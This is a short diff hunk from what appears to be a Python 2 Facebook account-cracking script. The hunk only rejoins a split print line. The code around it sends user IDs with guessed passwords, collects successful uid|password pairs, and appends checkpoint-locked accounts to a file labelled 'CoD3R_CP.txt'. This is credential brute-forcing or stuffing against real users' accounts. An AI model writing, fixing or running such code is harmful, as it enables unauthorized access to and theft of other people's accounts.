@@ -700,9 +700,7 @@ uid + '&pass=' + pass10, headers = header).text
                                                     ok.close()
                                                     oks.append(uid + pass10)
                                                 elif 'www.facebook.com' in q['error']:
-                                                    print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + 
-
-pass10
+                                                    print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass10
                                                     cp = open('CoD3R_CP.txt', 'a')
                                                     cp.write(uid + ' | ' + pass10 + '\n')
                                                     cp.close()
